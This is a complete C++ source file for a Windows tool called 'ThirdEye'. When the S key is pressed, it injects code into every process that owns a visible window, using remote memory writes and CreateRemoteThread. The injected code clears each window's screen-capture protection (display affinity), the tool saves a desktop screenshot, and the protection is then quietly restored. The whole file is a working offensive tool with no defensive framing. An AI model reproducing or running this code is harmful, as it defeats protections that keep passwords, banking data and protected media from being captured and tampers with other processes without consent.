#include <windows.h>
#include <gdiplus.h>
#include <iostream>
#include <vector>
#include <string>
#include <chrono>
#include <iomanip>
#include <sstream>
#include <map>
#include <cstring>

using namespace Gdiplus;

#ifdef __GNUC__
#define SEC_REMOTE __attribute__((section(".remote")))
#define FUNC_ATTRS __attribute__((no_instrument_function, optimize("O0"), force_align_arg_pointer))
#else
#pragma section(".remote", read, execute)
#define SEC_REMOTE __declspec(allocate(".remote"))
#define FUNC_ATTRS
#pragma runtime_checks( "", off )
#pragma optimize( "", off )
#pragma check_stack( off )
#endif

typedef HMODULE(WINAPI* pGetModuleHandleA)(LPCSTR);
typedef FARPROC(WINAPI* pGetProcAddress)(HMODULE, LPCSTR);
typedef DWORD(WINAPI* pWaitForSingleObject)(HANDLE, DWORD);
typedef BOOL(WINAPI* pReleaseSemaphore)(HANDLE, LONG, LPLONG);

#define MAX_HWNDS_PER_PID 256

struct INJECTION_DATA {
    DWORD count;
    HWND hwnds[MAX_HWNDS_PER_PID];
    DWORD originalAffinities[MAX_HWNDS_PER_PID];

    // API Pointers
    pGetModuleHandleA fnGetModuleHandleA;
    pGetProcAddress   fnGetProcAddress;
    pWaitForSingleObject fnWaitForSingleObject;
    pReleaseSemaphore fnReleaseSemaphore;

    // Synchronization Handles
    HANDLE hGlobalTriggerEvent;
    HANDLE hReadySemaphore;

    // Strings
    char libName[16];
    char setFuncName[64];
    char getFuncName[64];
};

struct RemoteContext {
    HANDLE hProcess;
    HANDLE hThread;
    LPVOID pRemoteData;
    LPVOID pRemoteCode;
    DWORD pid;
};

#pragma runtime_checks( "", off )
#pragma optimize( "", off )
#pragma check_stack( off )

extern "C" SEC_REMOTE FUNC_ATTRS
DWORD __stdcall RemoteThreadProc(LPVOID lpParameter) {
    INJECTION_DATA* pData = (INJECTION_DATA*)lpParameter;

    typedef DWORD(NTAPI* pSetWDA)(HWND, DWORD);
    typedef DWORD(NTAPI* pGetWDA)(HWND, DWORD*);

    pSetWDA fnSetWDA = nullptr;
    pGetWDA fnGetWDA = nullptr;

    HMODULE hLib = pData->fnGetModuleHandleA(pData->libName);
    if (hLib) {
        fnSetWDA = (pSetWDA)pData->fnGetProcAddress(hLib, pData->setFuncName);
        fnGetWDA = (pGetWDA)pData->fnGetProcAddress(hLib, pData->getFuncName);
    }

    if (!fnSetWDA || !fnGetWDA) return 1;

    bool foundProtectedWindow = false;

    for (DWORD i = 0; i < pData->count; i++) {
        if (pData->hwnds[i]) {
            DWORD currentAffinity = 0;
            fnGetWDA(pData->hwnds[i], &currentAffinity);
            pData->originalAffinities[i] = currentAffinity;

            if (currentAffinity != 0) {
                foundProtectedWindow = true;
                fnSetWDA(pData->hwnds[i], 0);
            }
        }
    }

    if (pData->hReadySemaphore) {
        pData->fnReleaseSemaphore(pData->hReadySemaphore, 1, nullptr);
    }

    pData->fnWaitForSingleObject(pData->hGlobalTriggerEvent, 10000);

    if (foundProtectedWindow) {
        for (DWORD i = 0; i < pData->count; i++) {
            if (pData->hwnds[i] && pData->originalAffinities[i] != 0) {
                fnSetWDA(pData->hwnds[i], pData->originalAffinities[i]);
            }
        }
    }

    return 0;
}

#ifndef __GNUC__
#pragma runtime_checks( "", restore )
#pragma optimize( "", on )
#pragma check_stack( on )
#endif

size_t GetRemoteSectionSize() {
    HMODULE hMod = GetModuleHandle(nullptr);
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hMod + pDosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);

    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (strncmp((char*)pSectionHeader[i].Name, ".remote", 8) == 0) {
            size_t size = pSectionHeader[i].Misc.VirtualSize;
            return size + 4095 & ~4095;
        }
    }
    return 0;
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0, size = 0;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (!pImageCodecInfo) return -1;
    GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    free(pImageCodecInfo);
    return -1;
}

void SaveScreenshot() {
    auto now = std::chrono::system_clock::now();
    auto in_time_t = std::chrono::system_clock::to_time_t(now);
    std::stringstream ss;
    ss << "screen_" << std::put_time(std::localtime(&in_time_t), "%Y-%m-%d_%H-%M-%S") << ".jpg";
    std::string fileNameStr = ss.str();
    std::wstring fileNameW(fileNameStr.begin(), fileNameStr.end());

    int x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int y = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int h = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    HDC hdcScreen = GetDC(nullptr);
    HDC hdcMemDC = CreateCompatibleDC(hdcScreen);
    HBITMAP hbm = CreateCompatibleBitmap(hdcScreen, w, h);
    SelectObject(hdcMemDC, hbm);

    BitBlt(hdcMemDC, 0, 0, w, h, hdcScreen, x, y, SRCCOPY);

    Bitmap bitmap(hbm, nullptr);
    CLSID clsid;
    if (GetEncoderClsid(L"image/jpeg", &clsid) != -1) {
        bitmap.Save(fileNameW.c_str(), &clsid, nullptr);
        std::cout << "[+] Saved: " << fileNameStr << std::endl;
    }

    DeleteObject(hbm);
    DeleteDC(hdcMemDC);
    ReleaseDC(nullptr, hdcScreen);
}

std::map<DWORD, std::vector<HWND>> g_ProcessWindows;

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    if (!IsWindowVisible(hwnd)) return TRUE;
    DWORD pid = 0;
    GetWindowThreadProcessId(hwnd, &pid);
    if (pid != GetCurrentProcessId()) {
        if (g_ProcessWindows[pid].size() < MAX_HWNDS_PER_PID) {
            g_ProcessWindows[pid].push_back(hwnd);
        }
    }
    return TRUE;
}

void Capture() {
    std::cout << "[*] Scanning desktop..." << std::endl;
    g_ProcessWindows.clear();
    EnumWindows(EnumWindowsProc, 0);

    HANDLE hGlobalTrigger = CreateEventA(nullptr, TRUE, FALSE, "Global\\ThirdEye_Trigger");
    ResetEvent(hGlobalTrigger);

    HANDLE hReadySemaphore = CreateSemaphoreA(nullptr, 0, 1000, "Global\\ThirdEye_Ready");

    std::vector<RemoteContext> activeInjections;

    size_t sectionSize = GetRemoteSectionSize();
    if (sectionSize == 0) {
        std::cout << "[!] Warning: .remote section not found. Code might be broken." << std::endl;
        sectionSize = 4096;
    }

    std::cout << "[*] Injecting code (Size: " << sectionSize << " bytes)..." << std::endl;

    for (auto const& [pid, hwnds] : g_ProcessWindows) {
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (!hProcess) continue;

        INJECTION_DATA data = { 0 };
        data.count = (DWORD)hwnds.size();
        for (size_t i = 0; i < data.count; i++) data.hwnds[i] = hwnds[i];

        data.fnGetModuleHandleA = GetModuleHandleA;
        data.fnGetProcAddress = GetProcAddress;
        data.fnWaitForSingleObject = WaitForSingleObject;
        data.fnReleaseSemaphore = ReleaseSemaphore;

        DuplicateHandle(GetCurrentProcess(), hGlobalTrigger, hProcess, &data.hGlobalTriggerEvent,
            0, FALSE, DUPLICATE_SAME_ACCESS);

        DuplicateHandle(GetCurrentProcess(), hReadySemaphore, hProcess, &data.hReadySemaphore,
            SEMAPHORE_MODIFY_STATE | SYNCHRONIZE, FALSE, 0);

        strncpy_s(data.libName, "win32u.dll", _TRUNCATE);
        strncpy_s(data.setFuncName, "NtUserSetWindowDisplayAffinity", _TRUNCATE);
        strncpy_s(data.getFuncName, "NtUserGetWindowDisplayAffinity", _TRUNCATE);

        LPVOID pRemoteData = VirtualAllocEx(hProcess, nullptr, sizeof(INJECTION_DATA), MEM_COMMIT, PAGE_READWRITE);
        LPVOID pRemoteCode = VirtualAllocEx(hProcess, nullptr, sectionSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        if (pRemoteData && pRemoteCode) {
            BOOL b1 = WriteProcessMemory(hProcess, pRemoteData, &data, sizeof(INJECTION_DATA), nullptr);
            BOOL b2 = WriteProcessMemory(hProcess, pRemoteCode, (LPCVOID)RemoteThreadProc, sectionSize, nullptr);

            if (b1 && b2) {
                HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0,
                    (LPTHREAD_START_ROUTINE)pRemoteCode, pRemoteData, 0, nullptr);

                if (hThread) {
                    activeInjections.push_back({ hProcess, hThread, pRemoteData, pRemoteCode, pid });
                    continue;
                }
            }
        }

        if (pRemoteData) VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);
        if (pRemoteCode) VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
    }

    if (!activeInjections.empty()) {
        std::cout << "[*] Waiting for " << activeInjections.size() << " processes to apply patch..." << std::endl;

        int readyCount = 0;

        for (size_t i = 0; i < activeInjections.size(); i++) {
            DWORD waitResult = WaitForSingleObject(hReadySemaphore, 1000);
            if (waitResult == WAIT_OBJECT_0) {
                readyCount++;
            } else {
                std::cout << "[!] Timeout waiting for process " << i << std::endl;
            }
        }
        std::cout << "[*] Ready: " << readyCount << "/" << activeInjections.size() << std::endl;
    }

    SaveScreenshot();

    std::cout << "[*] Restoring affinities..." << std::endl;
    SetEvent(hGlobalTrigger);

    for (auto& ctx : activeInjections) {
        WaitForSingleObject(ctx.hThread, 5000);
        VirtualFreeEx(ctx.hProcess, ctx.pRemoteData, 0, MEM_RELEASE);
        VirtualFreeEx(ctx.hProcess, ctx.pRemoteCode, 0, MEM_RELEASE);
        CloseHandle(ctx.hThread);
        CloseHandle(ctx.hProcess);
    }

    CloseHandle(hGlobalTrigger);
    CloseHandle(hReadySemaphore);
    std::cout << "[*] Done." << std::endl;
}

[[noreturn]] int main() {
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);

    std::cout << "[*] ThirdEye" << std::endl;
    std::cout << "[*] Press 'S' to capture." << std::endl;

    while (true) {
        if (GetAsyncKeyState(0x53) & 0x8000) {
            Capture();
            Sleep(1000);
        }
        Sleep(50);
    }
}